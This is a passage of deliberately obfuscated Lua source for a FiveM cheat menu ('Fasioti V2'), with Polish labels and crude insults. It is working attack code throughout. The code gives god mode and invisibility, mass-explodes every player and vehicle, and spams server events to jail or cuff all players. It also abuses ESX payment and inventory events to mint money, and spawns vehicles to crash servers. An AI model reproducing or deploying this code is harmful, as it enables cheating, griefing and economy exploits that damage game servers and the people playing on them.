							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("technical") or vtrherthterhthrtgtgrhrtg == GetHashKey("technical2") or vtrherthterhthrtgtgrhrtg == GetHashKey("technical3") then -- Technical
								if vhtrhtyvvvvvvvvvvvvvv ~= 426 then
									SetBlipSprite(vertegtrhthty, 426)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("taxi") then 
								if vhtrhtyvvvvvvvvvvvvvv ~= 198 then
									SetBlipSprite(vertegtrhthty, 198)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("fbi") or vtrherthterhthrtgtgrhrtg == GetHashKey("fbi2") or vtrherthterhthrtgtgrhrtg == GetHashKey("police2") or vtrherthterhthrtgtgrhrtg == GetHashKey("police3") -- Police Vehicles
								or vtrherthterhthrtgtgrhrtg == GetHashKey("police") or vtrherthterhthrtgtgrhrtg == GetHashKey("sheriff2") or vtrherthterhthrtgtgrhrtg == GetHashKey("sheriff")
								or vtrherthterhthrtgtgrhrtg == GetHashKey("policeold2") or vtrherthterhthrtgtgrhrtg == GetHashKey("policeold1") then
								if vhtrhtyvvvvvvvvvvvvvv ~= 56 then
									SetBlipSprite(vertegtrhthty, 56)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vhtrhtyvvvvvvvvvvvvvv ~= 1 then 
								SetBlipSprite(vertegtrhthty, 1)
								ShowHeadingIndicatorOnBlip(vertegtrhthty, true)
							end

							
							jytkt8irtgusjhrihgrtuihrtj = GetVehicleNumberOfPassengers(RETHHTRTERHTREGHTYGHYT)

							if jytkt8irtgusjhrihgrtuihrtj then
								if not IsVehicleSeatFree(RETHHTRTERHTREGHTYGHYT, -1) then
									jytkt8irtgusjhrihgrtuihrtj = jytkt8irtgusjhrihgrtuihrtj + 1
								end
								ShowNumberOnBlip(vertegtrhthty, jytkt8irtgusjhrihgrtuihrtj)
							else
								HideNumberOnBlip(vertegtrhthty)
							end
						else
							
							HideNumberOnBlip(vertegtrhthty)
							if vhtrhtyvvvvvvvvvvvvvv ~= 1 then
								SetBlipSprite(vertegtrhthty, 1)
								ShowHeadingIndicatorOnBlip(vertegtrhthty, true)
							end
						end
						
						SetBlipRotation(vertegtrhthty, math.ceil(GetEntityHeading(RETHHTRTERHTREGHTYGHYT))) 
						SetBlipNameToPlayerName(vertegtrhthty, HYTKULIUKUILU)
						SetBlipScale(vertegtrhthty,  0.85) 

						
						if vrhrthrtjrted() then
							SetBlipAlpha( vertegtrhthty, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(HYTKULIUKUILU), true))
							htrjtyytjtyjedtyghtgyh = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							

							if htrjtyytjtyjedtyghtgyh < 0 then
								htrjtyytjtyjedtyghtgyh = 0
							elseif htrjtyytjtyjedtyghtgyh > 255 then
								htrjtyytjtyjedtyghtgyh = 255
							end
							SetBlipAlpha(vertegtrhthty, htrjtyytjtyjedtyghtgyh)
						end
					end
				end
			end
		else
			for HYTKULIUKUILU = 0, 128 do
				vrtdbrthjrjhjtrrted = GetPlayerPed(HYTKULIUKUILU)
				vertegtrhthty = GetBlipFromEntity(vrtdbrthjrjhjtrrted)
				if DoesBlipExist(vertegtrhthty) then
					RemoveBlip(vertegtrhthty)
				end
				if IsMpGamerTagActive(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU]) then
					RemoveMpGamerTag(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU])
				end
			end
		end
	end
end)

Citizen.CreateThread(
	function()
		while BTBRTHJRJYHTJYRYTFY do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), htrhrhjhredthtyjry)
			SetEntityInvincible(PlayerPedId(), htrhrhjhredthtyjry)
			if fregergsrsefhthtreh then
				SetSuperJumpThisFrame(PlayerId())
			end
			
			if vtrhrtestgrhtyjhty then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

			if btrhrtethrertyjytejyt then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible_tutajzmien then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
				
			if vfgrtgrtjrvvvfgtrhththth then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
	end
end


			if vrthrtjytytktkutkuyk then
				local vregehrtjttryyt = "Freight"
				local hjtykytkulylilliulu = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					AleTenAPIACJESTCHUJOWYSKRTR("~g~Vehicle Gun !~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(vregehrtjttryyt)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(vregehrtjttryyt))
							end
							local RETHHTRTERHTREGHTYGHYT = CreateVehicle(GetHashKey(vregehrtjttryyt), hjtykytkulylilliulu.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), hjtykytkulylilliulu.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), hjtykytkulylilliulu.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(RETHHTRTERHTREGHTYGHYT)
							SetVehicleForwardSpeed(RETHHTRTERHTREGHTYGHYT, 150.0)
						end
					end
				end
			end

			if grehtrjtyjjytktuty then
				local vthtyjtyjtyrfdytr = weaewf3wewerewreh(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					AleTenAPIACJESTCHUJOWYSKRTR("~g~Delete Gun BTBRTHJRJYHTJYRYTFY!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(vthtyjtyjtyrfdytr) then
								if IsPedInAnyVehicle(vthtyjtyjtyrfdytr, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(vthtyjtyjtyrfdytr, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(vthtyjtyjtyrfdytr, true))
										SetEntityAsMissionEntity(vthtyjtyjtyrfdytr, 1, 1)
										DeleteEntity(vthtyjtyjtyrfdytr)
										AleTenAPIACJESTCHUJOWYSKRTR("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(vthtyjtyjtyrfdytr, 1, 1)
										DeleteEntity(vthtyjtyjtyrfdytr)
										AleTenAPIACJESTCHUJOWYSKRTR("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(vthtyjtyjtyrfdytr, 1, 1)
									DeleteEntity(vthtyjtyjtyrfdytr)
									AleTenAPIACJESTCHUJOWYSKRTR("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if grehtrjtyrjtydrtyyt then
				for vrthtrjtyktktuy in gregerg() do
					if (vrthtrjtyktktuy ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vrthtrjtyktktuy)
						SetVehicleUndriveable(vrthtrjtyktktuy,true)
						SetVehicleEngineHealth(vrthtrjtyktktuy, 100)
					end
				end
			end
			
						if vtrhjyjytryjyytkt then
				        for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent('cuffServer', GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(i))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				end
	  
			if hjtykytktykjytrfy then
				for vrthtrjtyktktuy in gregerg() do
					if (vrthtrjtyktktuy ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vrthtrjtyktktuy ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vrthtrjtyktktuy)
						NetworkExplodeVehicle(vrthtrjtyktktuy, true, true, false)
					end
				end
			end

			if verhrtjytjtyfrjy then
				for i = 0, 128 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local GTRHRTHGTRRTYJY = GREVGHEVHTHVRHR(1.0)
						local trjhrtyjytjtyffyt = GetPlayerPed(i)
						local htrjjyjrytr, hytkyyukyutyutfkyu, btrjrjejtyejytjyt = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(trjhrtyjytjtyffyt))
						local btrhyjyyjtrtjytfnytfhj =
							"~g~~h~" ..
							GetPlayerName(i) ..
										"\n~h~~b~ Dist: " .. math.vrevtrhrthrthr(GetDistanceBetweenCoords(htrjjyjrytr, hytkyyukyutyutfkyu, btrjrjejtyejytjyt, x, y, z, false), 1)
				
						gvrtehtrhjtrjrted(x, y, z + 1.0, btrhyjyyjtrtjytfnytfhj, 255, 255, 255)

						ggrthrt = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, -0.3, -0.9)
						trhtrhrth = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, -0.3, -0.9)
						gregreger = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, -0.3, -0.9)
						htrhrthtr = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, 0.3, -0.9)
						htrhtrhrt = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, 0.3, -0.9)
						hrthtrhr = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, 0.3, -0.9)
						htrhthtr = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, -0.3, -0.9)

						trhtrhrthr = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, -0.3, 0.8)
						htrhrthtr = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, -0.3, 0.8)
						rhtdrghbtgrht = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, -0.3, 0.8)
						dhthththt = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, 0.3, 0.8)
						dththdthtyjy = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, 0.3, 0.8)
						dyjyjjyjyt = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, 0.3, 0.8)
						yjdjyyjytjtyhtyh = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, -0.3, 0.8)

						dyjyjytdkytkyt = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, 0.3, 0.8)
						ddzaezdWDZd = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, 0.3, -0.9)
						dWZWDZwdzdxxef = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, 0.3, 0.8)
						fxrgrewqrefref = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, 0.3, -0.9)
						rewggrehhtrhtjwr = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, -0.3, 0.8)
						htwhhjrtwjrt = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, -0.3, -0.3, -0.9)
						trjtjwjtrj = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, -0.3, 0.8)
						wjjtrj = GetOffsetFromEntityInWorldCoords(trjhrtyjytjtyffyt, 0.3, -0.3, -0.9)
					end
				end
			end

			if ghtrwrhtrdtthdr then
				SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), gegrthrhttrehttrjyjyt, jytjeyjytjytjt, 1000000)
			end

			if vtrhjyjjyrtykkuyuky and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if GSEEEEEEEEEEEEEEDF then
                for i = 0, 128 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			if RTGHRHTTRJJRTYYTFY then
				for i = 0, 128 do
				TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, geje, 1337)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 999999 * 60, "siema geje")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, " ale gej ")
					end
				end

			if YIKUYLYLILIULULU then
				for i = 0, 128 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "jestes gejem", 10000000)
				end
			end
			
			if VTRHJTYJYJTYR then
				local BTRHRHTR = "phantom"
				local VRTHTRHTRHRT = "CARGOPLANE"
				local GERGREHTHTR = "luxor"
				local THRTHTRRTJRJYRJYR = "maverick"
				local GTHRTHRT = "bus"
				CreateVehicle(GetHashKey(VRTHTRHTRHRT), 0, 0, -10, true, true)
				CreateVehicle(GetHashKey(VRTHTRHTRHRT), 0, 0, -50, true, true)
				CreateVehicle(GetHashKey(VRTHTRHTRHRT), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(GERGREHTHTR), 0, 3, -1000, true, true)
				CreateVehicle(GetHashKey(GERGREHTHTR), 1621, 0, -50, true, true)
				CreateVehicle(GetHashKey(GERGREHTHTR), 1242, 1, -100, true, true)
				CreateVehicle(GetHashKey(BTRHRHTR), 612, 4, -10, true, true)
				CreateVehicle(GetHashKey(BTRHRHTR), 1234, 0, -50, true, true)
				CreateVehicle(GetHashKey(BTRHRHTR), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(GTHRTHRT), 512, 1233, -10, true, true)
				CreateVehicle(GetHashKey(GTHRTHRT), 155, 2, -50, true, true)
				CreateVehicle(GetHashKey(GTHRTHRT), 333, 0, -100, true, true)
				CreateVehicle(GetHashKey(THRTHTRRTJRJYRJYR), -121, 100, -10, true, true)
				CreateVehicle(GetHashKey(THRTHTRRTJRJYRJYR), -121, 2555, -50, true, true)
				CreateVehicle(GetHashKey(THRTHTRRTJRJYRJYR), -121, 123, -100, true, true)
			end

			if htrhrthrtjry then
				local BTRHRHTR = "phantom"
				local VRTHTRHTRHRT = "CARGOPLANE"
				local GERGREHTHTR = "luxor"
				local THRTHTRRTJRJYRJYR = "maverick"
				local GTHRTHRT = "bus"
                for i = 0, 128 do
						while not HasModelLoaded(GetHashKey(VRTHTRHTRHRT)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(VRTHTRHTRHRT))
						end
						Citizen.Wait(200)

						local GERGREHTHTR = CreateVehicle(GetHashKey(BTRHRHTR),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(BTRHRHTR),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(BTRHRHTR),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(VRTHTRHTRHRT),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(VRTHTRHTRHRT),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(VRTHTRHTRHRT),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(GERGREHTHTR),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(GERGREHTHTR),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(GERGREHTHTR),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(THRTHTRRTJRJYRJYR),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(THRTHTRRTJRJYRJYR),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(THRTHTRRTJRJYRJYR),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(GTHRTHRT),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(GTHRTHRT),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(GTHRTHRT),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end

			if tgrhtjytjtyjty and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 118) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 109) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if hehrtjtjytjtjtju then
				local hjyjytyjtyjjtyjtyjty, hytjkuykuuyhjty7hytujyuru = GetEntityPlayerIsFreeAimingAt(PlayerId(), hytjkuykuuyhjty7hytujyuru)
				if hjyjytyjtyjjtyjtyjty then
					if IsEntityAPed(hytjkuykuuyhjty7hytujyuru) and not IsPedDeadOrDying(hytjkuykuuyhjty7hytujyuru, 0) and IsPedAPlayer(hytjkuykuuyhjty7hytujyuru) then
						vrthrtjytjbbbbbbbbbbbbbbbbbbb(hytjkuykuuyhjty7hytujyuru)
					end
				end
			end

			if hytjtjtyjtyjrfyhytjyth then
				SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
				local vthtyjtyjtyrfdytr = weaewf3wewerewreh(PlayerId())
				if IsEntityAPed(vthtyjtyjtyrfdytr) then
					if IsPedInAnyVehicle(vthtyjtyjtyrfdytr, true) then
						if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
							if IsControlJustReleased(1, 69) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(vthtyjtyjtyrfdytr, true), true, true, 0)
							end
						else
							if IsControlJustReleased(1, 142) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(vthtyjtyjtyrfdytr, true), true, true, 0)
							end
						end
					end
				elseif IsEntityAVehicle(vthtyjtyjtyrfdytr) then
					if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
						if IsControlJustReleased(1, 69) then
							NetworkExplodeVehicle(vthtyjtyjtyrfdytr, true, true, 0)
						end
					else
						if IsControlJustReleased(1, 142) then
							NetworkExplodeVehicle(vthtyjtyjtyrfdytr, true, true, 0)
						end
					end
				end
			else
				SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
			end
 
			if GSEEEEEEEEEEEEEEDF then
                for i = 0, 64 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			DisplayRadar(true)

			if trhrthrtjytjytytut then
				local GTRHRTHGTRRTYJY = GREVGHEVHTHVRHR(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), GTRHRTHGTRRTYJY.r, GTRHRTHGTRRTYJY.g, GTRHRTHGTRRTYJY.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), GTRHRTHGTRRTYJY.r, GTRHRTHGTRRTYJY.g, GTRHRTHGTRRTYJY.b)
			end

			if htrjyjtyjuyuykyuk then
				local hrjytjytjtyjyt = 2
				local trjyytjtygrthythyt =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local htrjtykukuyyukyi = GetEntityCoords(vrerghtrhrykkyukuykyDWE)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local btrhrtjtjtjtyujuty = 0.0
				local rthtrjrytytrythytr = 0.0

				if btrhryjytyjktyktkuyku() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						btrhrtjtjtjtyujuty = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						btrhrtjtjtjtyujuty = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						rthtrjrytytrythytr = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						rthtrjrytytrythytr = -0.21
					end
				end

				htrjtykukuyyukyi =
					GetOffsetFromEntityInWorldCoords(trjyytjtygrthythyt, 0.0, btrhrtjtjtjtyujuty * (hrjytjytjtyjyt + 0.3), rthtrjrytytrythytr * (hrjytjytjtyjyt + 0.3))

				local hthytjtyjytjtyrytyj = GetEntityHeading(trjyytjtygrthythyt)
				SetEntityVelocity(trjyytjtygrthythyt, 0.0, 0.0, 0.0)
				SetEntityRotation(trjyytjtygrthythyt, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(trjyytjtygrthythyt, hthytjtyjytjtyrytyj)

				SetEntityCollision(trjyytjtygrthythyt, false, false)
				SetEntityCoordsNoOffset(trjyytjtygrthythyt, htrjtykukuyyukyi.x, htrjtykukuyyukyi.y, htrjtykukuyyukyi.z, true, true, true)

				FreezeEntityPosition(trjyytjtygrthythyt, false)
				SetEntityInvincible(trjyytjtygrthythyt, false)
				SetEntityCollision(trjyytjtygrthythyt, true, true)
			end
		end
	end
)

function htrjjyjttrtyjyt()
	local vtrvtrhrtrjytjyrfdtyjytytrf = {}

	for i = 0, 31 do
		if NetworkIsPlayerActive(i) then
			table.insert(vtrvtrhrtrjytjyrfdtyjytytrf, i)
		end
	end

	return vtrvtrhrtrjytjyrfdtyjytytrf
end


Citizen.CreateThread(
	function()
		FreezeEntityPosition(vrerghtrhrykkyukuykyDWE, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1


		APISHITACCCCCCCCCCCCC.GTRHRTHRJY("DDDDDDDDDDDDDDDDDDDDDDDDDDD", "<FONT COLOR='#fff'>~w~Fasioti ~p~V2  ")
		APISHITACCCCCCCCCCCCC.GTBRBYJNTYJYTJT("DDDDDDDDDDDDDDDDDDDDDDDDDDD", "~y~Kurwa nudzi mi sie")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("JJJJJJJJJJJJJJJJJJJJJJJJJJJJ", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "Opcje Gracza")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "World Menu")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("TRJYTJYTRHTTRHYTR", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "XD")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("GRGRTJHNTHJRHEHYT", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "Vehicle Menu")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("RHRTHTRHTEYJJYET", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "LUA Execution")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("THTRHRTJREJTYJYT", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "tworcy")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("JYTJRTYJYTYTRYTR", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "TeleportRawQ Menu")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY('HTRRJRYTYRY', 'DDDDDDDDDDDDDDDDDDDDDDDDDDD', 'Online Player Menu')
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY('TRRJYJYJRRYTYTJYYTYJJY', 'HTRRJRYTYRY', 'Player Options')
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY('HTRJYJTYYTKTYKTKTKUY', 'HTRRJRYTYRY', 'Single Weapon Menu')
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("KUYKUYTUYTUKUYKUYTKU", "DDDDDDDDDDDDDDDDDDDDDDDDDDD", "Weapon Menu")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("RTGRSTGRFRSTGTRGRTG", "KUYKUYTUYTUKUYKUYTKU", "Single Weapon Menu")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("XZWDEFEWFEWFXWEFEA", "RHRTHTRHTEYJJYET", "ESX Boss Menus")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("VHRTRTCRVHRTHVRTH", "RHRTHTRHTEYJJYET", "Money Options")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("VRHTRHRTHTJHTREJT", "RHRTHTRHTEYJJYET", "ESX Misc Options")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("ESXDrugsHRAGRHRTHRTRT", "RHRTHTRHTEYJJYET", "ESX Drugs")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("VTRHTRHRTETJY", "RHRTHTRHTEYJJYET", "Misc Server Options")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("TRHHTEJYTYT", "RHRTHTRHTEYJJYET", "Recrutar Players")
		APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY("TRBRTEHTHTT", "TRHHTEJYTYT", "Recrutar Players options")

		local ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK

		while BTBRTHJRJYHTJYRYTFY do
			if APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("DDDDDDDDDDDDDDDDDDDDDDDDDDD") then
			    AleTenAPIACJESTCHUJOWYSKRTR("~h~ale bym se zjadl kebsa")
				AleTenAPIACJESTCHUJOWYSKRTR("~h~Fasioti V2 Activated")
				   if APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#ca4e4e'>∑<FONT COLOR='#595959'>Opcje Gracza", "JJJJJJJJJJJJJJJJJJJJJJJJJJJJ") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#7871c1'>∑<FONT COLOR='#595959'>Opcje Podglądania", "HTRRJRYTYRY") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#636576'>∑<FONT COLOR='#595959'>Opcje Gry", "JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#59b4ce'>∑<FONT COLOR='#595959'>Opcje Teleportu", "JYTJRTYJYTYTRYTR") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#6da582'>∑<FONT COLOR='#595959'>Opcje Samochodu", "GRGRTJHNTHJRHEHYT") then
